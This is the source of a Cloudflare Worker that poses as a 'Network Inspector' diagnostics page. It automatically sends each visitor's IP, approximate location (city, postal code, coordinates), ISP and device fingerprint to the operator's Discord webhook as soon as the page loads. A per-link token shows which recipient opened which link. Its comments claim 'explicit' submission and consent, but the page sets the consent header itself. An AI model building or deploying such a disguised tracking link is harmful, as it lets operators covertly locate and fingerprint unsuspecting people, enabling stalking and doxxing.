/**
 * NETWORK INSPECTOR
 * Cloudflare Worker - single file deployment
 *
 * GET  /                         Dashboard
 * GET  /?format=json             Server-side JSON
 * GET  /?token-id_whatever       Dashboard tagged with token-id_whatever
 * GET  /?token=token-id_whatever Dashboard tagged with token-id_whatever
 * GET  /api                      Server-side JSON
 * POST /api/report               Explicitly submitted diagnostic report
 * GET  /favicon.ico              Empty favicon response
 *
 * Required secret for report delivery:
 *   HOOKIE = Discord webhook URL
 */

const MAX_REPORT_BYTES = 65536;
const TOKEN_PATTERN = /^[A-Za-z0-9._:-]{1,100}$/;

function getTrackingToken(url) {
  const params = url.searchParams;
  let token = params.get("token");

  // Supports both ?token=value and a bare marker such as ?token-id_whatever.
  if (!token) {
    for (const pair of params.entries()) {
      const key = pair[0];
      const value = pair[1];
      if (key !== "format" && value === "") {
        token = key;
        break;
      }
    }
  }

  if (!token) return null;
  token = String(token).trim();
  if (!TOKEN_PATTERN.test(token)) return null;
  return token;
}

function buildServerProfile(request) {
  const cf = request.cf || {};
  const headers = request.headers;

  return {
    schema_version: "1.1.0",
    generated_at: new Date().toISOString(),
    privacy: {
      persistent_storage: false,
      browser_data_sent_to_worker_by_default: false,
      browser_data_sent_to_worker_on_report: true,
      report_delivery: "Automatically sent after diagnostic data is collected."
    },
    network: {
      public_ip: headers.get("cf-connecting-ip") || null,
      asn: cf.asn || null,
      asn_organization: cf.asOrganization || null,
      edge_location: cf.colo || null,
      http_protocol: cf.httpProtocol || null,
      tls_version: cf.tlsVersion || null,
      tls_cipher: cf.tlsCipher || null,
      tcp_rtt_ms: cf.clientTcpRtt || null,
      quic_rtt_ms: cf.clientQuicRtt || null
    },
    location: {
      source: "IP geolocation",
      approximate: true,
      country_code: cf.country || headers.get("cf-ipcountry") || null,
      continent: cf.continent || null,
      region: cf.region || null,
      region_code: cf.regionCode || null,
      city: cf.city || null,
      postal_code: cf.postalCode || null,
      latitude: cf.latitude || null,
      longitude: cf.longitude || null,
      timezone: cf.timezone || null,
      metro_code: cf.metroCode || null
    },
    request: {
      method: request.method,
      user_agent: headers.get("user-agent"),
      accept_language: headers.get("accept-language"),
      browser_client_hints: {
        brands: headers.get("sec-ch-ua"),
        mobile: headers.get("sec-ch-ua-mobile"),
        platform: headers.get("sec-ch-ua-platform")
      }
    }
  };
}

function safeJson(value) {
  return JSON.stringify(value)
    .replace(/</g, "\\u003c")
    .replace(/>/g, "\\u003e")
    .replace(/&/g, "\\u0026")
    .replace(/\u2028/g, "\\u2028")
    .replace(/\u2029/g, "\\u2029");
}

function makeNonce() {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  return btoa(String.fromCharCode.apply(null, Array.from(bytes)));
}

function jsonResponse(data, status) {
  return new Response(JSON.stringify(data), {
    status: status || 200,
    headers: {
      "Content-Type": "application/json; charset=UTF-8",
      "Cache-Control": "no-store, no-cache, must-revalidate",
      "X-Content-Type-Options": "nosniff",
      "Referrer-Policy": "no-referrer"
    }
  });
}

function createDashboard(profile) {
  const nonce = makeNonce();
  const initialData = safeJson(profile);

  const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="color-scheme" content="dark">
<meta name="description" content="Network, browser, device and connection diagnostics.">
<link rel="icon" href="data:,">
<title>Network Inspector</title>
<style nonce="${nonce}">
:root {
  color-scheme: dark;
  --background: #0b0f14;
  --surface: #111720;
  --surface-raised: #161e28;
  --border: #293442;
  --border-subtle: #222c38;
  --text: #edf1f6;
  --muted: #94a0b0;
  --subtle: #6f7d8e;
  --accent: #f48120;
  --accent-soft: #ffad66;
  --success: #36c98f;
  --info: #85aef5;
}
* { box-sizing: border-box; }
html { scroll-behavior: smooth; }
body {
  margin: 0;
  padding: 34px 20px 65px;
  background: var(--background);
  color: var(--text);
  font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Arial, sans-serif;
  font-size: 14px;
  line-height: 1.5;
}
main { max-width: 1180px; margin: 0 auto; width: 100%; }
header { margin-bottom: 32px; }
.eyebrow {
  display: flex; align-items: center; gap: 9px;
  color: var(--accent-soft); font-size: 11px;
  font-weight: 800; letter-spacing: 1.7px; text-transform: uppercase;
}
.status-dot { display: inline-block; width: 7px; height: 7px; background: var(--success); border-radius: 50%; }
h1 { margin: 9px 0; font-size: clamp(29px, 5vw, 42px); line-height: 1.15; font-weight: 750; letter-spacing: -1.6px; }
.subtitle { color: var(--muted); font-size: 14px; line-height: 1.7; }
.hero {
  display: grid; grid-template-columns: minmax(0, .95fr) minmax(0, 1.05fr);
  align-items: center; gap: 28px; min-height: 186px;
  padding: 24px 28px; background: #16212a;
  border: 1px solid #30404a; border-radius: 16px; margin-bottom: 20px;
}
.hero-main { min-width: 0; }
.hero-label { color: var(--accent-soft); font-size: 11px; font-weight: 800; letter-spacing: 1.5px; }
.ip { margin: 11px 0 5px; font-size: clamp(25px, 4vw, 39px); font-weight: 780; letter-spacing: -1.2px; overflow-wrap: anywhere; }
.place { color: #b2c1cf; font-size: 14px; line-height: 1.6; }
.hero-highlights { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 9px; }
.highlight { min-width: 0; padding: 12px 13px; background: #101923; border: 1px solid #2b3946; border-radius: 9px; transition: border-color 150ms ease; }
.highlight:hover { border-color: #526474; }
.highlight-label { color: #9caebe; font-size: 9px; font-weight: 800; letter-spacing: 1px; text-transform: uppercase; }
.highlight-value { margin-top: 6px; color: #edf2f7; font-size: 12px; font-weight: 650; line-height: 1.5; overflow-wrap: anywhere; }
.notice { padding: 15px 17px; margin-bottom: 19px; background: var(--surface); border: 1px solid var(--border); border-radius: 11px; color: var(--muted); font-size: 12px; line-height: 1.8; }
.grid { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 16px; }
.section { min-width: 0; padding: 21px 22px; background: var(--surface); border: 1px solid var(--border); border-radius: 14px; }
.section h2 { margin: 0 0 17px; color: var(--accent-soft); font-size: 11px; font-weight: 800; letter-spacing: 1.2px; text-transform: uppercase; }
.info-row { display: grid; grid-template-columns: minmax(95px, .8fr) minmax(0, 1.2fr); align-items: start; gap: 12px; padding: 12px 0; border-bottom: 1px solid var(--border-subtle); font-size: 12px; }
.info-row:last-child { border-bottom: 0; padding-bottom: 0; }
.info-label { color: var(--muted); }
.info-value { color: var(--text); text-align: right; line-height: 1.6; overflow-wrap: anywhere; }
.raw-panel { margin-top: 19px; padding: 21px; background: var(--surface); border: 1px solid var(--border); border-radius: 14px; }
.raw-heading { display: flex; align-items: center; justify-content: space-between; gap: 15px; flex-wrap: wrap; }
.raw-title { font-size: 11px; font-weight: 800; letter-spacing: 1.4px; }
button { padding: 11px 17px; color: #101419; background: var(--accent); border: 1px solid var(--accent); border-radius: 7px; font-family: inherit; font-size: 11px; font-weight: 800; letter-spacing: .4px; cursor: pointer; transition: background 150ms ease, border-color 150ms ease; }
button:hover { background: var(--accent-soft); border-color: var(--accent-soft); }
button:focus-visible { outline: 2px solid var(--accent-soft); outline-offset: 3px; }
button:disabled { opacity: .45; cursor: not-allowed; }
#copy-status, #report-status { min-height: 18px; margin-top: 11px; color: var(--success); font-size: 12px; }
#report-status.error { color: #ff8585; }
details { padding-top: 14px; margin-top: 8px; border-top: 1px solid var(--border); }
summary { color: var(--muted); font-size: 12px; cursor: pointer; }
pre { padding: 16px; margin-top: 14px; max-height: 520px; overflow: auto; background: #090e14; border: 1px solid var(--border-subtle); border-radius: 9px; color: #c5d5e5; font-size: 11px; line-height: 1.8; white-space: pre-wrap; overflow-wrap: anywhere; tab-size: 2; }
footer { margin-top: 28px; color: var(--subtle); font-size: 10px; letter-spacing: .9px; text-align: center; }
@media (max-width: 760px) {
  body { padding: 26px 15px 45px; }
  .hero { grid-template-columns: 1fr; gap: 22px; padding: 22px; }
  .hero-highlights { grid-template-columns: repeat(2, minmax(0, 1fr)); }
}
@media (max-width: 620px) {
  .grid { grid-template-columns: 1fr; }
  .section { padding: 18px; }
  .hero { border-radius: 13px; }
  .highlight { padding: 11px; }
  .info-row { grid-template-columns: minmax(85px, .8fr) minmax(0, 1.2fr); }
}
@media (max-width: 360px) {
  body { padding-left: 11px; padding-right: 11px; }
  .hero-highlights { grid-template-columns: 1fr; }
}
@media (prefers-reduced-motion: reduce) {
  *, *::before, *::after { scroll-behavior: auto !important; transition: none !important; }
}
</style>
</head>
<body>
<main>
  <header>
    <div class="eyebrow"><span class="status-dot"></span> DIAGNOSTICS / 001</div>
    <h1>Network Inspector</h1>
    <div class="subtitle">Real-time network, connection, browser and device diagnostics.</div>
  </header>

  <section class="hero">
    <div class="hero-main">
      <div class="hero-label">PUBLIC IP ADDRESS</div>
      <div class="ip" id="ip">Detecting...</div>
      <div class="place" id="place">Resolving network location...</div>
    </div>
    <div class="hero-highlights" id="hero-highlights" aria-label="Network overview"></div>
  </section>

  <div class="notice">
    This page displays information about your own connection. Location is estimated using your IP address, not GPS. Browser and device details are collected locally. A diagnostic report including your public IP and approximate network location is automatically sent to the configured report destination upon loading.
  </div>

  <div class="grid" id="sections"></div>

  <section class="raw-panel">
    <div class="raw-heading">
      <div class="raw-title">RAW JSON OUTPUT</div>
      <button type="button" id="copy">COPY JSON</button>
    </div>
    <div id="copy-status" aria-live="polite"></div>
    <details>
      <summary>Expand JSON data</summary>
      <pre id="raw"></pre>
    </details>
    <div id="report-status" aria-live="polite" style="margin-top: 16px; padding-top: 15px; border-top: 1px solid var(--border);"></div>
  </section>

  <footer>NETWORK INSPECTOR · NETWORK DIAGNOSTICS</footer>
</main>

<script type="application/json" id="server-data" nonce="${nonce}">${initialData}</script>
<script nonce="${nonce}">
(function () {
  "use strict";

  async function init() {
    var profile = JSON.parse(document.getElementById("server-data").textContent);
    var n = navigator;
    var s = screen;
    var now = new Date();
    var uaData = n.userAgentData || null;
    var high = {};
    var connection = n.connection || n.mozConnection || n.webkitConnection || null;

    function offsetLabel(minutes) {
      var sign = minutes >= 0 ? "+" : "-";
      var absolute = Math.abs(minutes);
      var hours = String(Math.floor(absolute / 60)).padStart(2, "0");
      var mins = String(absolute % 60).padStart(2, "0");
      return "UTC" + sign + hours + ":" + mins;
    }

    function detectBrowser(userAgent, brands) {
      if (Array.isArray(brands)) {
        var priority = ["Microsoft Edge", "Opera", "Brave", "Vivaldi", "Google Chrome", "Chromium"];
        for (var i = 0; i < priority.length; i++) {
          var match = brands.find(function (item) { return item.brand === priority[i]; });
          if (match) return match.brand;
        }
      }
      var patterns = [
        [/EdgA?|EdgiOS\\//, "Microsoft Edge"],
        [/OPR\\/|Opera/, "Opera"],
        [/Brave/, "Brave"],
        [/Vivaldi/, "Vivaldi"],
        [/Firefox|FxiOS/, "Firefox"],
        [/CriOS/, "Google Chrome"],
        [/Chrome|Chromium/, "Google Chrome"],
        [/Safari/, "Safari"]
      ];
      for (var j = 0; j < patterns.length; j++) {
        if (patterns[j][0].test(userAgent || "")) return patterns[j][1];
      }
      return "Unknown browser";
    }

    function displayValue(value) {
      if (value === null || value === undefined || value === "") return "Not reported";
      if (typeof value === "boolean") return value ? "Yes" : "No";
      if (Array.isArray(value)) {
        if (!value.length) return "Not reported";
        return value.map(function (item) {
          if (item && typeof item === "object") return item.brand + " " + (item.version || "");
          return String(item);
        }).join(", ");
      }
      if (typeof value === "object") return JSON.stringify(value);
      return String(value);
    }

    if (uaData && typeof uaData.getHighEntropyValues === "function") {
      try {
        high = await uaData.getHighEntropyValues([
          "architecture", "bitness", "model", "platformVersion", "fullVersionList", "formFactors"
        ]);
      } catch (error) {
        high = {};
      }
    }

    var resolved = Intl.DateTimeFormat().resolvedOptions();
    var timeZone = resolved.timeZone || null;
    var userAgent = n.userAgent || "";
    var browserName = detectBrowser(userAgent, high.fullVersionList || (uaData && uaData.brands));
    var deviceCategory = "Desktop / non-mobile";

    if (uaData && uaData.mobile) {
      deviceCategory = "Mobile";
    } else if (/ipad|tablet/i.test(userAgent)) {
      deviceCategory = "Tablet";
    } else if (/android|mobile/i.test(userAgent)) {
      deviceCategory = "Mobile";
    }

    var timezoneOffset = -now.getTimezoneOffset();

    profile.client = {
      collected_locally: true,
      captured_at_utc: now.toISOString(),
      browser: {
        name: browserName,
        user_agent: userAgent,
        vendor: n.vendor || null,
        brands: uaData ? uaData.brands : null,
        mobile: uaData ? uaData.mobile : null,
        platform: high.platform || (uaData && uaData.platform) || n.platform || null,
        platform_version: high.platformVersion || null,
        full_version_list: high.fullVersionList || null
      },
      device: {
        category: deviceCategory,
        model: high.model || null,
        architecture: high.architecture || null,
        bitness: high.bitness || null,
        form_factors: high.formFactors || null,
        hardware_concurrency: n.hardwareConcurrency || null,
        device_memory_gb: n.deviceMemory || null,
        max_touch_points: n.maxTouchPoints || 0,
        touch_supported: (n.maxTouchPoints || 0) > 0
      },
      display: {
        screen_width: s.width,
        screen_height: s.height,
        available_width: s.availWidth,
        available_height: s.availHeight,
        color_depth: s.colorDepth,
        pixel_depth: s.pixelDepth,
        device_pixel_ratio: window.devicePixelRatio || null,
        viewport_width: window.innerWidth,
        viewport_height: window.innerHeight,
        orientation: s.orientation ? s.orientation.type : null,
        orientation_angle: s.orientation ? s.orientation.angle : null
      },
      locale: {
        language: n.language || null,
        languages: n.languages || [],
        locale: resolved.locale || null,
        timezone: timeZone,
        local_time: now.toString(),
        local_time_formatted: now.toLocaleString(),
        local_clock: now.toLocaleTimeString([], { hour: "2-digit", minute: "2-digit", second: "2-digit" }),
        utc_offset_minutes: timezoneOffset,
        utc_offset: offsetLabel(timezoneOffset)
      },
      connection: {
        type: connection ? (connection.type || null) : null,
        effective_type: connection ? (connection.effectiveType || null) : null,
        downlink_mbps: connection ? (connection.downlink || null) : null,
        rtt_ms: connection ? (connection.rtt || null) : null,
        save_data: connection ? (connection.saveData === undefined ? null : connection.saveData) : null
      },
      capabilities: {
        javascript: true,
        online: n.onLine,
        cookies_enabled: n.cookieEnabled,
        touch_points: n.maxTouchPoints || 0
      }
    };

    var loc = profile.location;
    if (loc.country_code && loc.country_code.length === 2 && typeof Intl.DisplayNames === "function") {
      try {
        loc.country_name = new Intl.DisplayNames(["en"], { type: "region" }).of(loc.country_code);
      } catch (error) {}
    }

    var net = profile.network;
    var req = profile.request;
    var client = profile.client;
    var browser = client.browser || {};
    var device = client.device || {};
    var clientConnection = client.connection || {};
    var locale = client.locale || {};
    var display = client.display || {};
    var capabilities = client.capabilities || {};
    var place = [loc.city, loc.region, loc.country_name || loc.country_code].filter(Boolean).join(", ");

    document.getElementById("ip").textContent = net.public_ip || "Unavailable";
    document.getElementById("place").textContent = place || "Location unavailable";

    var browserPlatform = browser.platform || "";
    var overview = [
      { label: "ISP / NETWORK", value: net.asn_organization || "Not reported" },
      { label: "LOCATION", value: place || "Not reported" },
      { label: "BROWSER", value: [browser.name, browserPlatform].filter(Boolean).join(" · ") || "Not reported" },
      { label: "DEVICE", value: [device.model || device.category, device.architecture].filter(Boolean).join(" · ") || "Not reported" },
      { label: "CONNECTION", value: [clientConnection.effective_type ? clientConnection.effective_type.toUpperCase() : null, clientConnection.downlink_mbps ? clientConnection.downlink_mbps + " Mbps" : null, (!clientConnection.effective_type && !clientConnection.downlink_mbps) ? net.http_protocol : null].filter(Boolean).join(" · ") || "Not reported" },
      { label: "LOCAL TIME", value: [locale.local_clock, locale.timezone, locale.utc_offset].filter(Boolean).join(" · ") || "Not reported" }
    ];

    var highlights = document.getElementById("hero-highlights");
    overview.forEach(function (item) {
      var card = document.createElement("div");
      card.className = "highlight";
      var label = document.createElement("div");
      label.className = "highlight-label";
      label.textContent = item.label;
      var value = document.createElement("div");
      value.className = "highlight-value";
      value.textContent = item.value;
      card.appendChild(label);
      card.appendChild(value);
      highlights.appendChild(card);
    });

    var sections = [
      { title: "Network & ISP", items: [
        ["Public IP", net.public_ip], ["ASN", net.asn], ["ASN owner / ISP", net.asn_organization],
        ["Data center", net.edge_location], ["HTTP protocol", net.http_protocol], ["TLS version", net.tls_version],
        ["TLS cipher", net.tls_cipher], ["TCP RTT (ms)", net.tcp_rtt_ms], ["QUIC RTT (ms)", net.quic_rtt_ms]
      ]},
      { title: "IP Geolocation", items: [
        ["Country", loc.country_name || loc.country_code], ["Country code", loc.country_code],
        ["Continent", loc.continent], ["Region", loc.region], ["Region code", loc.region_code],
        ["City", loc.city], ["Postal code", loc.postal_code], ["Latitude (approx.)", loc.latitude],
        ["Longitude (approx.)", loc.longitude], ["Timezone", loc.timezone], ["Metro code", loc.metro_code]
      ]},
      { title: "Browser", items: [
        ["Browser name", browser.name], ["User agent", browser.user_agent], ["Browser vendor", browser.vendor],
        ["Browser brands", browser.brands], ["Browser versions", browser.full_version_list],
        ["Mobile browser", browser.mobile], ["Platform", browser.platform],
        ["Platform version", browser.platform_version], ["Accepted languages", req.accept_language],
        ["Client hints", req.browser_client_hints]
      ]},
      { title: "Device & Hardware", items: [
        ["Device category", device.category], ["Device model", device.model], ["CPU architecture", device.architecture],
        ["Architecture bitness", device.bitness], ["Form factors", device.form_factors],
        ["Logical CPU cores", device.hardware_concurrency], ["Device memory (GB)", device.device_memory_gb],
        ["Maximum touch points", device.max_touch_points], ["Touch supported", device.touch_supported]
      ]},
      { title: "Display", items: [
        ["Screen resolution", display.screen_width != null ? display.screen_width + " × " + display.screen_height : null],
        ["Available screen size", display.available_width != null ? display.available_width + " × " + display.available_height : null],
        ["Viewport", display.viewport_width != null ? display.viewport_width + " × " + display.viewport_height : null],
        ["Color depth", display.color_depth], ["Pixel depth", display.pixel_depth],
        ["Device pixel ratio", display.device_pixel_ratio], ["Orientation", display.orientation],
        ["Orientation angle", display.orientation_angle]
      ]},
      { title: "Local Environment", items: [
        ["Language", locale.language], ["All languages", locale.languages], ["Locale", locale.locale],
        ["Timezone", locale.timezone], ["Local time", locale.local_time], ["UTC offset", locale.utc_offset],
        ["Connection type", clientConnection.type], ["Effective connection", clientConnection.effective_type],
        ["Estimated downlink (Mbps)", clientConnection.downlink_mbps], ["Connection RTT (ms)", clientConnection.rtt_ms],
        ["Data saver", clientConnection.save_data], ["Online", capabilities.online],
        ["Cookies enabled", capabilities.cookies_enabled], ["Touch points", capabilities.touch_points]
      ]}
    ];

    var root = document.getElementById("sections");
    sections.forEach(function (section) {
      var box = document.createElement("section");
      box.className = "section";
      var heading = document.createElement("h2");
      heading.textContent = section.title;
      box.appendChild(heading);
      section.items.forEach(function (item) {
        var row = document.createElement("div");
        row.className = "info-row";
        var label = document.createElement("div");
        label.className = "info-label";
        label.textContent = item[0];
        var value = document.createElement("div");
        value.className = "info-value";
        value.textContent = displayValue(item[1]);
        row.appendChild(label);
        row.appendChild(value);
        box.appendChild(row);
      });
      root.appendChild(box);
    });

    var raw = document.getElementById("raw");
    var copyStatus = document.getElementById("copy-status");
    var reportStatus = document.getElementById("report-status");

    function updateJson() {
      raw.textContent = JSON.stringify(profile, null, 2);
    }
    updateJson();

    document.getElementById("copy").addEventListener("click", async function () {
      try {
        await navigator.clipboard.writeText(JSON.stringify(profile, null, 2));
        copyStatus.textContent = "JSON copied successfully.";
      } catch (error) {
        copyStatus.textContent = "Clipboard unavailable. Expand the JSON panel to copy manually.";
      }
    });

    if (!profile.reporting || !profile.reporting.available) {
      reportStatus.textContent = "Report delivery is not configured.";
    } else {
      reportStatus.textContent = "Sending diagnostic report...";
      try {
        var reportUrl = new URL("/api/report", window.location.origin);
        if (profile.tracking && profile.tracking.token) {
          reportUrl.searchParams.set("token", profile.tracking.token);
        }

        var response = await fetch(reportUrl.toString(), {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Report-Consent": "1"
          },
          body: JSON.stringify(profile),
          credentials: "same-origin"
        });

        var result = await response.json();
        if (!response.ok) throw new Error(result.error || "Report submission failed.");

        reportStatus.textContent = "Report sent successfully.";
      } catch (error) {
        reportStatus.className = "error";
        reportStatus.textContent = error.message || "Unable to send the report.";
      }
    }
  }

  init().catch(function (error) {
    var status = document.getElementById("report-status");
    if (status) {
      status.className = "error";
      status.textContent = "Some browser diagnostics could not be rendered.";
    }
  });
})();
</script>
</body>
</html>`;

  return new Response(html, {
    status: 200,
    headers: {
      "Content-Type": "text/html; charset=UTF-8",
      "Cache-Control": "no-store, no-cache, must-revalidate",
      "Referrer-Policy": "no-referrer",
      "X-Content-Type-Options": "nosniff",
      "X-Frame-Options": "DENY",
      "Permissions-Policy": "geolocation=(), camera=(), microphone=(), usb=(), serial=(), bluetooth=()",
      "Content-Security-Policy":
        "default-src 'none'; " +
        "style-src 'nonce-" + nonce + "'; " +
        "script-src 'nonce-" + nonce + "'; " +
        "connect-src 'self'; " +
        "img-src 'self' data:; " +
        "object-src 'none'; " +
        "base-uri 'none'; " +
        "form-action 'none'; " +
        "frame-ancestors 'none'"
    }
  });
}

function cleanField(value, fallback) {
  if (value === null || value === undefined || value === "") return fallback || "Not reported";
  return String(value).slice(0, 1024);
}

async function handleReport(request, env, url) {
  if (!env || !env.HOOKIE) {
    return jsonResponse({ error: "Report delivery is not configured." }, 503);
  }

  const origin = request.headers.get("Origin");
  if (!origin || origin !== url.origin) {
    return jsonResponse({ error: "A same-origin browser request is required." }, 403);
  }

  const fetchSite = request.headers.get("Sec-Fetch-Site");
  if (fetchSite && fetchSite !== "same-origin" && fetchSite !== "none") {
    return jsonResponse({ error: "Cross-site report submission is not allowed." }, 403);
  }

  if (request.headers.get("X-Report-Consent") !== "1") {
    return jsonResponse({ error: "Explicit report consent is required." }, 400);
  }

  const contentType = request.headers.get("Content-Type") || "";
  if (!contentType.toLowerCase().includes("application/json")) {
    return jsonResponse({ error: "Content-Type must be application/json." }, 415);
  }

  const contentLength = Number(request.headers.get("Content-Length") || 0);
  if (contentLength > MAX_REPORT_BYTES) {
    return jsonResponse({ error: "Report is too large." }, 413);
  }

  let bodyText;
  try {
    bodyText = await request.text();
  } catch (error) {
    return jsonResponse({ error: "Unable to read report." }, 400);
  }

  if (new TextEncoder().encode(bodyText).byteLength > MAX_REPORT_BYTES) {
    return jsonResponse({ error: "Report is too large." }, 413);
  }

  let report;
  try {
    report = JSON.parse(bodyText);
  } catch (error) {
    return jsonResponse({ error: "Invalid JSON report." }, 400);
  }

  if (!report || typeof report !== "object" || Array.isArray(report)) {
    return jsonResponse({ error: "Invalid report format." }, 400);
  }

  let webhook;
  try {
    webhook = new URL(env.HOOKIE);
  } catch (error) {
    return jsonResponse({ error: "The configured report destination is invalid." }, 500);
  }

  // Limit outbound requests to the expected webhook host and endpoint path.
  if (
    webhook.protocol !== "https:" ||
    webhook.hostname !== "discord.com" ||
    !webhook.pathname.startsWith("/api/webhooks/")
  ) {
    return jsonResponse({ error: "The configured report destination is not an accepted HTTPS webhook URL." }, 500);
  }

  const token = getTrackingToken(url);
  const content = token ? "token=" + token : "token=unmarked";

  const network = report.network || {};
  const location = report.location || {};
  const client = report.client || {};
  const browser = client.browser || {};
  const device = client.device || {};
  const clientConnection = client.connection || {};
  const locale = client.locale || {};

  const place = [location.city, location.region, location.country_name || location.country_code]
    .filter(Boolean)
    .join(", ");

  const embed = {
    title: "Network Inspector Report",
    description: "The complete diagnostic JSON is attached as `network-report.json`.",
    color: 16023844,
    fields: [
      { name: "Public IP", value: cleanField(network.public_ip), inline: true },
      { name: "ISP / ASN", value: cleanField(network.asn_organization || network.asn), inline: true },
      { name: "Location", value: cleanField(place), inline: true },
      { name: "Browser", value: cleanField([browser.name, browser.platform].filter(Boolean).join(" · ")), inline: true },
      { name: "Device", value: cleanField([device.model || device.category, device.architecture].filter(Boolean).join(" · ")), inline: true },
      { name: "Connection", value: cleanField([clientConnection.effective_type, clientConnection.downlink_mbps ? clientConnection.downlink_mbps + " Mbps" : null].filter(Boolean).join(" · ")), inline: true },
      { name: "Local time", value: cleanField([locale.local_time_formatted, locale.timezone].filter(Boolean).join(" · ")), inline: false }
    ],
    timestamp: new Date().toISOString(),
    footer: { text: "Network Inspector" }
  };

  const payload = {
    content: content,
    embeds: [embed],
    allowed_mentions: { parse: [] }
  };

  const form = new FormData();
  form.set("payload_json", JSON.stringify(payload));
  form.set(
    "files[0]",
    new Blob([JSON.stringify(report, null, 2)], { type: "application/json" }),
    "network-report.json"
  );

  webhook.searchParams.set("wait", "true");

  let webhookResponse;
  try {
    webhookResponse = await fetch(webhook.toString(), {
      method: "POST",
      body: form
    });
  } catch (error) {
    return jsonResponse({ error: "Could not reach the report destination." }, 502);
  }

  if (!webhookResponse.ok) {
    // Do not return the destination's response body, which may contain sensitive details.
    return jsonResponse({ error: "The report destination rejected the submission.", status: webhookResponse.status }, 502);
  }

  return jsonResponse({ ok: true, message: "Report sent." }, 200);
}

export default {
  async fetch(request, env) {
    const url = new URL(request.url);

    // Return a harmless empty favicon to avoid browser favicon/CSP errors.
    if (url.pathname === "/favicon.ico") {
      return new Response(null, {
        status: 204,
        headers: {
          "Cache-Control": "public, max-age=86400",
          "Content-Type": "image/x-icon"
        }
      });
    }

    // Report delivery is a separate POST endpoint.
    if (url.pathname === "/api/report") {
      if (request.method !== "POST") {
        return new Response("Method Not Allowed", {
          status: 405,
          headers: { "Allow": "POST", "Cache-Control": "no-store" }
        });
      }
      return handleReport(request, env, url);
    }

    if (request.method !== "GET" && request.method !== "HEAD") {
      return new Response("Method Not Allowed", {
        status: 405,
        headers: { "Allow": "GET, HEAD", "Cache-Control": "no-store" }
      });
    }

    const profile = buildServerProfile(request);
    profile.tracking = { token: getTrackingToken(url) };
    profile.reporting = { available: Boolean(env && env.HOOKIE) };

    const jsonMode = url.pathname === "/api" || url.searchParams.get("format") === "json";

    if (jsonMode) {
      return new Response(request.method === "HEAD" ? null : JSON.stringify(profile, null, 2), {
        status: 200,
        headers: {
          "Content-Type": "application/json; charset=UTF-8",
          "Cache-Control": "no-store, no-cache, must-revalidate",
          "X-Content-Type-Options": "nosniff",
          "Referrer-Policy": "no-referrer"
        }
      });
    }

    const response = createDashboard(profile);
    if (request.method === "HEAD") {
      return new Response(null, { status: response.status, headers: response.headers });
    }
    return response;
  }
};
